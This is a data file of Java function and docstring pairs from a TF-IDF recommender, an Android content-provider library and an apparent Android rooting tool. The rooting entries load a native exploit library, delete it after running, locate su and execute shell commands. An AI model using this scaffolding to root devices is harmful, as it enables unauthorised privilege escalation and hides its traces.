{"docstring": "/**\n * \n* @Title: idf\n* @Description: idf = log(n / docs(w, D)) \n* @param @param containWordOfAllDocNumberMap\n* @param @return Map<String, Double> \n* @return Map<String,Double>   \n* @throws\n */\n", "func_signal": "public static Map<String, Double> idf(Map<String, Map<String, Integer>> allSegsMap)", "code": "{\n\tif(allSegsMap==null || allSegsMap.size()==0){\n\t\treturn idfMap;\n\t}\n\tcontainWordOfAllDocNumberMap=containWordOfAllDocNumber(allSegsMap);\n\tSet<String> words=containWordOfAllDocNumberMap.keySet();\n\tDouble wordSize=Double.valueOf(containWordOfAllDocNumberMap.size());\n\tfor(String word: words){\n\t\tDouble number=Double.valueOf(containWordOfAllDocNumberMap.get(word));\n\t\tidfMap.put(word, Math.log(wordSize/(number+1.0d)));\n\t}\n\treturn idfMap;\n}", "path": "src\\com\\xq\\algorithm\\TfIdfAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: getSentences\n* @Description: \u628a\u6bb5\u843d\u6309. ! ?\u5206\u9694\u6210\u53e5\u7ec4\n* @param @param input\n* @param @return    \n* @return String[]   \n* @throws\n */\n", "func_signal": "public static String[] getSentences(String input)", "code": "{\n    if (input == null) {\n        return new String[0];\n    } else {\n        // split on a \".\", a \"!\", a \"?\" followed by a space or EOL\n    \t//\"(\\\\.|!|\\\\?)+(\\\\s|\\\\z)\"\n        return input.split(\"(\\\\.|!|\\\\?)\");\n    }\n\n}", "path": "src\\com\\xq\\algorithm\\SimpleSummariserAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "// TODO: Use only one ContentLoadTask to MessageEdit and MessageDetail\n", "func_signal": "private Cursor queryDatabase(Uri message)", "code": "{\n    @SuppressWarnings(\"deprecation\")\n    final Cursor c = managedQuery(message, PROJECTION, null, null, null);\n    return c;\n}", "path": "example\\src\\edu\\mit\\mobile\\android\\content\\example\\MessageEdit.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * @param uri\n *            the uri whose path segment you wish to extract\n * @param nth\n *            number of path segments from the end. 0 is the last one, 1 is the second to last\n *            one, etc.\n * @return\n */\n", "func_signal": "public static String getNthPathFromEnd(Uri uri, int nth)", "code": "{\n\n    final List<String> path = uri.getPathSegments();\n    final int size = path.size();\n    final int pos = size - 1 - nth;\n    if (pos < 0) {\n        throw new IllegalArgumentException(\"there are not \" + nth\n                + \" path segments from the end of \" + uri);\n    }\n\n    return path.get(pos);\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\ProviderUtils.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Remove count path segments from the end of a URI\n *\n * @param uri\n * @param count\n * @return a new uri built off the supplied uri with the last count path segments removed\n */\n", "func_signal": "public static Uri removeLastPathSegments(Uri uri, int count)", "code": "{\n    final List<String> pathWithoutLast = new Vector<String>(uri.getPathSegments());\n    for (int i = 0; i < count; i++) {\n        pathWithoutLast.remove(pathWithoutLast.size() - 1);\n    }\n    final String parentPath = TextUtils.join(\"/\", pathWithoutLast);\n    return uri.buildUpon().path(parentPath).build();\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\ProviderUtils.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * <p>\n * Generates a complete MIME type string in the following format:\n * {@code vnd.android.cursor.dir/vnd.AUTHORITY.SUFFIX}\n * </p>\n *\n * <p>\n * SUFFIX is filtered so all invalid characters (see <a\n * href=\"http://tools.ietf.org/html/bcp13\">BCP13</a>) are replaced with\n * {@link #MIME_INVALID_CHAR_REPLACEMENT}.\n * </p>\n *\n * @param authority\n *            the authority for this type\n * @param suffix\n *            a raw suffix\n * @return the MIME type for the given suffix\n */\n", "func_signal": "public static String toDirType(String authority, String suffix)", "code": "{\n    suffix = MIME_INVALID_CHARS.matcher(suffix).replaceAll(MIME_INVALID_CHAR_REPLACEMENT);\n    return ProviderUtils.TYPE_DIR_PREFIX + authority + \".\" + suffix;\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\ProviderUtils.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Selects rows from the FROM table that have a relation from any of the items in the TO table.\n * The ID of the item in the TO table that matches can be selected using\n * {@link #getJoinTableName()}.{@link M2MColumns#TO_ID}\n *\n * @param db\n *            DB that contains all the tables\n * @param fromProjection\n *            projection for the TO table\n * @param selection\n *            any extra selection query or null\n * @param selectionArgs\n *            any extra selection arguments or null\n * @param sortOrder\n *            the desired sort order or null\n * @return a cursor whose content represents the to table\n */\n", "func_signal": "public Cursor queryFrom(SQLiteDatabase db, String[] fromProjection, String selection,\n        String[] selectionArgs, String sortOrder)", "code": "{\n    // XXX hack to get around ambiguous column names. Is there a better way to write this query?\n    if (selection != null) {\n        // matches \"foo=bar\" but not \"foo.baz=bar\"; only qualifies unqualified column names\n        selection = selection.replaceAll(\"((?<!\\\\.)\\\\b\\\\w+=\\\\?)\", mFromTable + \".$1\");\n    }\n\n    return db.query(mFromTable + \" INNER JOIN \" + mJoinTable + \" ON \" + mJoinTable + \".\"\n            + M2MColumns.FROM_ID + \"=\" + mFromTable + \".\" + BaseColumns._ID,\n            ProviderUtils.addPrefixToProjection(mFromTable, fromProjection), selection,\n            selectionArgs, null, null, sortOrder);\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\m2m\\M2MReverseHelper.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Gets the database column type of the field. The field must have a {@link DBColumn}\n * annotation.\n *\n * @param field\n *            the given {@code static String} field.\n * @return the type of the field, as defined in the annotation or {@code null} if the given\n *         field has no {@link DBColumn} annotation.\n * @throws SQLGenerationException\n *             if an annotation is present, but there's an error in the field definition.\n */\n", "func_signal": "public Class<? extends DBColumnType<?>> getFieldType(Field field)\n        throws SQLGenerationException", "code": "{\n    try {\n\n        final DBColumn t = field.getAnnotation(DBColumn.class);\n\n        if (t == null) {\n            return null;\n        }\n\n        final int m = field.getModifiers();\n\n        if (!String.class.equals(field.getType()) || !Modifier.isStatic(m)\n                || !Modifier.isFinal(m)) {\n            throw new SQLGenerationException(\n                    \"Columns defined using @DBColumn must be static final Strings.\");\n        }\n        return t.type();\n\n    } catch (final IllegalArgumentException e) {\n        throw new SQLGenerationException(\n                \"field claimed to be static, but something went wrong on invocation\", e);\n\n    } catch (final SecurityException e) {\n        throw new SQLGenerationException(\"cannot access class fields\", e);\n    }\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\annotation\\SQLExtractor.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * TODO:\n *   - Use only one ContentLoadTask to MessageEdit and MessageDetail\n *   - Implement the 'updated' information on ContentProvider\n */\n", "func_signal": "private void loadContent(Cursor c)", "code": "{\n    // One should always check that the returned cursor has content. The\n    // cursor will automatically seek to the first position, so\n    // this does both.\n    if (c.moveToFirst()) {\n        // If one is loading many items that all use the same column index,\n        // it's most efficient to cache the column indexes to local\n        // variables. Otherwise, one can just use the shortcut shown below:\n        final String title = c.getString(c.getColumnIndex(Message.TITLE));\n\n        mTitle.setText(title);\n        setTitle(title);\n\n        mBody.setText(c.getString(c.getColumnIndex(Message.BODY)));\n        mId.setText(c.getString(c.getColumnIndex(Message._ID)));\n    } else {\n        // If moveToFirst didn't return true, that means our URI no longer\n        // resolves. The most common reason for this is that the content was\n        // deleted.\n        finish();\n    }\n}", "path": "example\\src\\edu\\mit\\mobile\\android\\content\\example\\MessageEdit.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Convert the currently filled-in form to a ContentValues object that can be saved\n *\n * @return the current user-entered data as ContentValues\n */\n", "func_signal": "private ContentValues toContentValues()", "code": "{\n    // place your content inside a ContentValues object.\n    final ContentValues cv = new ContentValues();\n    cv.put(Message.TITLE, mTitle.getText().toString());\n    cv.put(Message.BODY, mBody.getText().toString());\n\n    return cv;\n}", "path": "example\\src\\edu\\mit\\mobile\\android\\content\\example\\MessageEdit.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Validates the form and alerts the user to any invalid data\n *\n * @return true if the filled-in form is valid\n */\n", "func_signal": "private boolean validate()", "code": "{\n\n    // setError is a great way to display error messages to users, as it\n    // keeps the message close to the source of the error.\n    if (mTitle.getText().length() == 0) {\n        mTitle.setError(\"Please enter a title\");\n        mTitle.requestFocus();\n        return false;\n    }\n\n    if (mBody.getText().length() == 0) {\n        mBody.setError(\"Please enter a body\");\n        mBody.requestFocus();\n        return false;\n    }\n\n    return true;\n}", "path": "example\\src\\edu\\mit\\mobile\\android\\content\\example\\MessageEdit.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * @return the version string returned by sqlite_version()\n * @see <a href=\"http://stackoverflow.com/questions/2421189/version-of-sqlite-used-in-android\">StackOverflow Version of SQLite used in Android?</a>\n */\n", "func_signal": "private static final String getSqliteVersion()", "code": "{\n    final SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(\":memory:\", null);\n    final Cursor cursor = db.rawQuery(\"select sqlite_version() AS sqlite_version\", null);\n    String sqliteVersion = \"\";\n    if(cursor.moveToNext()){\n       sqliteVersion += cursor.getString(0);\n    }\n    cursor.close();\n    db.close();\n\n    return sqliteVersion;\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\AndroidVersions.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Ensures that there is a person at uri who matches name. the uri can resolve to more than one\n *\n * @param uri\n * @param name\n * @return\n */\n", "func_signal": "private Cursor assertPerson(Uri uri, String name)", "code": "{\n    final MockContentResolver cr = getMockContentResolver();\n\n    // first look through all the results to ensure that it matches.\n\n    Cursor c = cr.query(uri, null, null, null, null);\n\n    try {\n        assertTrue(c.moveToFirst());\n\n        final int nameCol = c.getColumnIndex(Person.NAME);\n\n        boolean found = false;\n\n        for (; !c.isAfterLast(); c.moveToNext()) {\n            if (name.equals(c.getString(nameCol))) {\n                found = true;\n                break;\n            }\n        }\n        assertTrue(found);\n    } finally {\n\n        c.close();\n    }\n\n    // then try selecting it using a selection\n\n    c = cr.query(uri, null, Person.NAME + \"=?\", new String[] { name }, null);\n\n    try {\n        assertTrue(c.moveToFirst());\n\n        assertEquals(1, c.getCount());\n\n        final int nameCol = c.getColumnIndex(Person.NAME);\n\n        assertEquals(name, c.getString(nameCol));\n\n    } finally {\n\n        c.close();\n    }\n\n    return c;\n\n}", "path": "test\\src\\edu\\mit\\mobile\\android\\content\\test\\SampleProvider3Test.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Removes key from the given ContentValues and returns it.\n *\n * @param cv\n *            the input ContentValues whose key will be removed\n * @param key\n * @return the value\n */\n", "func_signal": "public static Object extractContentValueItem(ContentValues cv, String key)", "code": "{\n    final Object val = cv.get(key);\n    cv.remove(key);\n    return val;\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\ProviderUtils.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Generates SQL code for creating this object's table. Creation is done by inspecting the\n * static strings that are marked with {@link DBColumn} annotations.\n *\n * @return CREATE TABLE code for creating this table.\n * @throws SQLGenerationException\n *             if there were any problems creating the table\n * @see DBColumn\n * @see DBTable\n */\n", "func_signal": "public List<String> getTableCreation() throws SQLGenerationException", "code": "{\n    // pre, create table, post\n    final LinkedList<String> preTableSql = new LinkedList<String>();\n    final LinkedList<String> postTableSql = new LinkedList<String>();\n\n    try {\n        final StringBuilder tableSQL = new StringBuilder();\n\n        tableSQL.append(\"CREATE TABLE \");\n        tableSQL.append(mTable);\n        tableSQL.append(\" (\");\n\n        boolean needSep = false;\n        for (final Field field : mDataItem.getFields()) {\n            final DBColumn t = field.getAnnotation(DBColumn.class);\n            final DBForeignKeyColumn fk = field.getAnnotation(DBForeignKeyColumn.class);\n            if (t == null && fk == null) {\n                continue;\n            }\n\n            final int m = field.getModifiers();\n\n            if (!String.class.equals(field.getType()) || !Modifier.isStatic(m)\n                    || !Modifier.isFinal(m)) {\n                throw new SQLGenerationException(\n                        \"Columns defined using @DBColumn must be static final Strings.\");\n            }\n\n            if (needSep) {\n                tableSQL.append(',');\n            }\n\n            if (t != null) {\n                appendColumnDef(tableSQL, t, field, preTableSql, postTableSql);\n\n            } else if (fk != null) {\n                appendFKColumnDef(tableSQL, fk, field);\n            }\n\n            needSep = true;\n        }\n        tableSQL.append(\")\");\n\n        preTableSql.add(tableSQL.toString());\n\n        preTableSql.addAll(postTableSql);\n\n        return preTableSql;\n\n    } catch (final IllegalArgumentException e) {\n        throw new SQLGenerationException(\n                \"field claimed to be static, but something went wrong on invocation\", e);\n\n    } catch (final IllegalAccessException e) {\n        throw new SQLGenerationException(\"default constructor not visible\", e);\n\n    } catch (final SecurityException e) {\n        throw new SQLGenerationException(\"cannot access class fields\", e);\n\n    } catch (final InstantiationException e) {\n        throw new SQLGenerationException(\"cannot instantiate field type class\", e);\n    }\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\annotation\\SQLExtractor.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Inspects the {@link ContentItem} and extracts a table name from it. If there is a @DBTable\n * annotation, uses that name. Otherwise, uses a lower-cased, sanitized version of the\n * classname.\n *\n * @return a valid table name\n * @throws SQLGenerationException\n */\n", "func_signal": "public static String extractTableName(Class<? extends ContentItem> dataItem)\n        throws SQLGenerationException", "code": "{\n    String tableName = null;\n    final DBTable tableNameAnnotation = dataItem.getAnnotation(DBTable.class);\n    if (tableNameAnnotation != null) {\n\n        tableName = tableNameAnnotation.value();\n        if (!SQLGenUtils.isValidName(tableName)) {\n            throw new SQLGenerationException(\"Illegal table name: '\" + tableName + \"'\");\n        }\n    } else {\n        tableName = SQLGenUtils.toValidName(dataItem);\n    }\n    return tableName;\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\annotation\\SQLExtractor.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * <p>\n * Adds a {@link GenericDBHelper} to the list of search helpers that will be queried for this\n * search. All the registered DBHelpers will be searched and results will be mixed together.\n * </p>\n *\n * <p>\n * The columns to search, provided in {@code searchColumns}, will be queried using a simple\n * {@code LIKE \"%query%\"} substring search. The results are concatenate using {@code UNION ALL}.\n * </p>\n *\n * @param helper\n *            the helper you wish to search. This must return a valid result for\n *            {@link GenericDBHelper#getTable()}.\n * @param contentUri\n *            the base URI that will be used when linking back to the item from the search\n *            results (see {@link SearchManager#SUGGEST_COLUMN_INTENT_DATA}). This can be null\n *            to disable this feature.\n * @param text1Column\n *            the text column that will be used for {@link SearchManager#SUGGEST_COLUMN_TEXT_1}.\n *            This is required.\n * @param text2Column\n *            the text column that will be used for {@link SearchManager#SUGGEST_COLUMN_TEXT_2}.\n *            This is optional and can be null.\n * @param searchColumns\n *            a list of the columns that will be searched for the given keyword.\n */\n", "func_signal": "public void registerDBHelper(GenericDBHelper helper, Uri contentUri, String text1Column,\n        String text2Column, String... searchColumns)", "code": "{\n    mRegisteredHelpers.add(new RegisteredHelper(helper, contentUri, text1Column, text2Column,\n            searchColumns));\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\dbhelper\\SearchDBHelper.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Converts a version code, eg. \"3.4.2\" into a number that can be compared. The newer the version, the higher the resulting integer\n * @param version a version string\n * @return a number that can be compared against the output of this function\n */\n", "func_signal": "private static final long versionToCode(String version)", "code": "{\n    long vernum = 0;\n    for (final String verCode : version.split(VER_STRING_DELIMITER)){\n        vernum += Integer.parseInt(verCode);\n        vernum *= 1000;\n    }\n    return vernum;\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\AndroidVersions.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Handly helper\n *\n * @param c\n * @param projection\n */\n", "func_signal": "public static void dumpCursorToLog(Cursor c, String[] projection)", "code": "{\n    final StringBuilder testOut = new StringBuilder();\n    for (final String row : projection) {\n        testOut.append(row);\n        testOut.append(\"=\");\n\n        if (c.isNull(c.getColumnIndex(row))) {\n            testOut.append(\"<<null>>\");\n        } else {\n            testOut.append(c.getString(c.getColumnIndex(row)));\n\n        }\n        testOut.append(\"; \");\n    }\n    Log.d(\"CursorDump\", testOut.toString());\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\ProviderUtils.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * Selects rows from the FROM table that have a relation from the given item in the TO table.\n *\n * @param toId\n *            _ID of the item on the FROM side of the relationship\n * @param db\n *            DB that contains all the tables\n * @param fromProjection\n *            projection for the TO table\n * @param selection\n *            any extra selection query or null\n * @param selectionArgs\n *            any extra selection arguments or null\n * @param sortOrder\n *            the desired sort order or null\n * @return a cursor whose content represents the to table\n */\n", "func_signal": "public Cursor queryFrom(long toId, SQLiteDatabase db, String[] fromProjection,\n        String selection, String[] selectionArgs, String sortOrder)", "code": "{\n    return queryFrom(db, fromProjection,\n            ProviderUtils.addExtraWhere(selection, mJoinTable + \".\" + M2MColumns.TO_ID + \"=?\"),\n            ProviderUtils.addExtraWhereArgs(selectionArgs, Long.toString(toId)), sortOrder);\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\m2m\\M2MReverseHelper.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * For a given {@code field}, return the value of the field. All fields must be\n * {@code static String}s whose content is the column name. This method ensures that they\n * fit this requirement.\n *\n * @param field\n *            the {@code static String} field\n * @return the value of the field.\n * @throws SQLGenerationException\n *             if the field doesn't meet the necessary requirements.\n */\n", "func_signal": "public String getDbColumnName(Field field) throws SQLGenerationException", "code": "{\n    String dbColumnName;\n    try {\n        dbColumnName = (String) field.get(null);\n\n    } catch (final IllegalArgumentException e) {\n        throw new SQLGenerationException(\"programming error\", e);\n\n    } catch (final IllegalAccessException e) {\n        throw new SQLGenerationException(\"field '\" + field.getName()\n                + \"' cannot be accessed\", e);\n\n    } catch (final NullPointerException e) {\n        throw new SQLGenerationException(\"field '\" + field.getName() + \"' is not static\", e);\n    }\n\n    if (!SQLGenUtils.isValidName(dbColumnName)) {\n        throw new SQLGenerationException(\"@DBColumn '\" + dbColumnName\n                + \"' is not a valid SQLite column name.\");\n    }\n\n    return dbColumnName;\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\annotation\\SQLExtractor.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * <p>\n * Generates a complete MIME type string in the following format:\n * {@code vnd.android.cursor.item/vnd.AUTHORITY.SUFFIX}\n * </p>\n *\n *\n * <p>\n * SUFFIX is filtered so all invalid characters (see <a\n * href=\"http://tools.ietf.org/html/bcp13\">BCP13</a>) are replaced with\n * {@link #MIME_INVALID_CHAR_REPLACEMENT}.\n * </p>\n *\n * @param authority\n *            the authority for this type\n * @param suffix\n *            a raw suffix\n * @return the MIME type for the given suffix\n */\n", "func_signal": "public static String toItemType(String authority, String suffix)", "code": "{\n    suffix = MIME_INVALID_CHARS.matcher(suffix).replaceAll(MIME_INVALID_CHAR_REPLACEMENT);\n    return ProviderUtils.TYPE_ITEM_PREFIX + authority + \".\" + suffix;\n}", "path": "src\\edu\\mit\\mobile\\android\\content\\ProviderUtils.java", "repo_name": "mitmel/SimpleContentProvider", "stars": 80, "license": "other", "language": "java", "size": 1082}
{"docstring": "/**\n * \u68c0\u67e5root\u670d\u52a1\u662f\u5426\u5b58\u5728\n */\n", "func_signal": "private boolean checkRT_server(c paramc)", "code": "{\n\tif (paramc != null) {\n\t\treturn paramc.onCheckRootServerExist();\n\t}\n\treturn false;\n}", "path": "src\\com\\qihoo\\permmgr\\PermManager.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u4ece\u73af\u5883\u53d8\u91cf\u4e2d\u67e5\u627esu\u7684\u5168\u8def\u5f84\n */\n", "func_signal": "public static String getSuPath()", "code": "{\n\tString path = System.getenv(\"PATH\");\n\tString[] pathArray = new String[]{};\n\tint pathCount = 0;\n\tif ((path != null) && (path.length() > 0)) {\n\t\tpathArray = path.split(\":\");\n\t\tpathCount = pathArray.length;\n\t}\n\tfor (int j = 0; j < pathCount; j++) {\n\t\tFile suFile = new File(pathArray[j], \"su\");\n\t\tif (suFile.exists())\n\t\t\treturn suFile.getPath();\n\t}\n\treturn null;\n}", "path": "src\\com\\qihoo\\permmgr\\util\\b.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u52a8\u6001\u5e93\u7684\u8def\u5f84\n */\n", "func_signal": "public int doRoot(java.lang.String paramString, android.content.SharedPreferences paramSharedPreferences, c paramc)", "code": "{\n\tSystem.load(paramString);\n\tint nRet = jmain(0);\n\tjunmain(getClass());\n\tif (nRet != 3059 || paramc == null) {\n\t\tFile file = new File(paramString);\n\t\tif (true == file.exists()) file.delete();\n\t\treturn nRet;\n\t}\n\tfor (int i = 0; i < 10; ++i) {\n\t\tif (paramc.onCheckRootServerExist() == true) {\n\t\t\tFile file = new File(paramString);\n\t\t\tif (true == file.exists()) file.delete();\n\t\t\treturn nRet;\n\t\t}\n\t\ttry {\n\t\t\tThread.sleep(500);\n\t\t} catch (InterruptedException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\tnRet = -2000;\n\treturn nRet;\n}", "path": "src\\com\\qihoo\\permmgr\\LocalRoot.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u5220\u9664\u67d0\u4e2a\u503c\n * \n * @param key\n *            \u952e\n */\n", "func_signal": "public void remove(String key)", "code": "{\n\tmEditor.remove(key);\n\tmEditor.commit();\n}", "path": "src\\com\\qihoo\\sharestore\\SharedStore.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u68c0\u67e5daemon\u662f\u5426\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\n */\n", "func_signal": "public boolean checkDaemonIsRunning()", "code": "{\n\tOutInfo info = (OutInfo) jcheckdaemon(this.mInfo);\n\treturn info.running >= 0;\n}", "path": "src\\com\\qihoo\\permmgr\\PermManager.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u5199\u5165\u4e00\u4e2aboolean \u6570\u636e\n * \n * @param key\n *            \u5bf9\u8c61key\n * @param value\n *            \u5bf9\u8c61\u503c\n * @author Melvin\n * @date 2013-4-22\n * @return void\n */\n", "func_signal": "public void putBoolean(String key, boolean value)", "code": "{\n\tmEditor.putBoolean(key, value);\n\tmEditor.commit();\n}", "path": "src\\com\\qihoo\\sharestore\\SharedStore.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u68c0\u67e5asset/permmgr\u76ee\u5f55\u4e0e\u7a0b\u5e8f\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5927\u5c0f\u662f\u5426\u4e00\u81f4\n */\n", "func_signal": "private boolean checkFileSize(String paramString, File paramFile)", "code": "{\n\tAssetManager assetManager = mContext.getAssets();\n\ttry {\n\t\tInputStream is = assetManager.open(\"permmgr/\" + paramString);\n\t\tif (is.available() == paramFile.length()) {\n\t\t\treturn true;\n\t\t}\n\t} catch (IOException e) {\n\t\te.printStackTrace();\n\t}\n\treturn false;\n}", "path": "src\\com\\qihoo\\permmgr\\PermManager.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u8bbe\u7f6e\u76d1\u542c\u5668\n */\n", "func_signal": "private void setListener()", "code": "{\n\tmHandler = new Handler() {\n\t\tpublic void handleMessage(Message msg) {\n\t\t\tString text = String.valueOf(msg.obj);\n\t\t\tmStatusText.append(text);\n\t\t\tsuper.handleMessage(msg);\n\t\t}\n\t};\n\tmBrowerApkFileBtn.setOnClickListener(new View.OnClickListener() {\n\t\t@Override\n\t\tpublic void onClick(View v) {\n\t\t\tIRootService rtService = getRTService();\n\t\t\tif (rtService != null) {\n\t\t\t\tshowFileChooser();\n\t\t\t} else {\n\t\t\t\tToast.makeText(MainActivity.this,\n\t\t\t\t\t\t\"root process not started.\", Toast.LENGTH_SHORT)\n\t\t\t\t\t\t.show();\n\t\t\t}\n\t\t}\n\t});\n}", "path": "src\\com\\uucun\\root\\MainActivity.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u5199\u5165\u4e00\u4e2afloat\u6570\u636e\n * \n * @param key\n *            \u5bf9\u8c61key\n * @param value\n *            \u5bf9\u8c61\u503c\n * @author Melvin\n * @date 2013-4-22\n * @return void\n */\n", "func_signal": "public void putFloat(String key, float value)", "code": "{\n\tmEditor.putFloat(key, value);\n\tmEditor.commit();\n}", "path": "src\\com\\qihoo\\sharestore\\SharedStore.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u4e0d\u4ee5su\u8eab\u4efd\u6267\u884c\u5355\u6761\u547d\u4ee4\n */\n", "func_signal": "public static String a(String paramString)", "code": "{\n\ttry {\n\t\tProcess localProcess = Runtime.getRuntime().exec(paramString);\n\t\tBufferedReader localBufferedReader = new BufferedReader(\n\t\t\t\tnew InputStreamReader(localProcess.getInputStream()));\n\t\tchar[] arrayOfChar = new char[4096];\n\t\tStringBuffer localStringBuffer = new StringBuffer();\n\t\twhile (true) {\n\t\t\tint i = localBufferedReader.read(arrayOfChar);\n\t\t\tif (i <= 0) {\n\t\t\t\tlocalBufferedReader.close();\n\t\t\t\tlocalProcess.waitFor();\n\t\t\t\treturn localStringBuffer.toString();\n\t\t\t}\n\t\t\tlocalStringBuffer.append(arrayOfChar, 0, i);\n\t\t}\n\t} catch (IOException localIOException) {\n\t\treturn \"unknow\";\n\t} catch (InterruptedException localInterruptedException) {\n\t\treturn localInterruptedException.getMessage();\n\t}\n}", "path": "src\\com\\qihoo\\permmgr\\util\\b.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u662f\u5426\u6709su\u6587\u4ef6\n */\n", "func_signal": "public static boolean b()", "code": "{\n\ttry {\n\t\tString str = getSuPath();\n\t\tif (str != null)\n\t\t\treturn true;\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\treturn false;\n}", "path": "src\\com\\qihoo\\permmgr\\util\\b.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u8bbe\u7f6e\u5f53\u524d\u7684\u72b6\u6001\n */\n", "func_signal": "public void setStatus(String status)", "code": "{\n\tMessage msg = new Message();\n\tmsg.what = 0;\n\tmsg.obj = status;\n\tmHandler.sendMessage(msg);\n}", "path": "src\\com\\uucun\\root\\MainActivity.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u6267\u884c\u591a\u6761\u6307\u4ee4\n */\n", "func_signal": "public static String a(File paramFile, String[] paramArrayOfString)", "code": "{\n\ttry {\n\t\tProcessBuilder pb = new ProcessBuilder();\n\t\tpb.command(paramArrayOfString);\n\t\tpb.redirectErrorStream(true);\n\t\tpb.directory(paramFile);\n\t\tMap<String, String> env = pb.environment();\n\t\tProcess procees = pb.start();\n\t\tInputStream is = procees.getInputStream();\n\t\tString result = readStream(is, \"utf-8\");\n\t\tis.close();\n\t\treturn result;\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\treturn null;\n}", "path": "src\\com\\qihoo\\permmgr\\util\\b.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u5199\u5165\u4e00\u4e2along\u6570\u636e\n * \n * @param key\n *            \u5bf9\u8c61key\n * @param value\n *            \u5bf9\u8c61\u503c\n * @author Melvin\n * @date 2013-4-22\n * @return void\n */\n", "func_signal": "public void putLong(String key, long value)", "code": "{\n\tmEditor.putLong(key, value);\n\tmEditor.commit();\n}", "path": "src\\com\\qihoo\\sharestore\\SharedStore.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
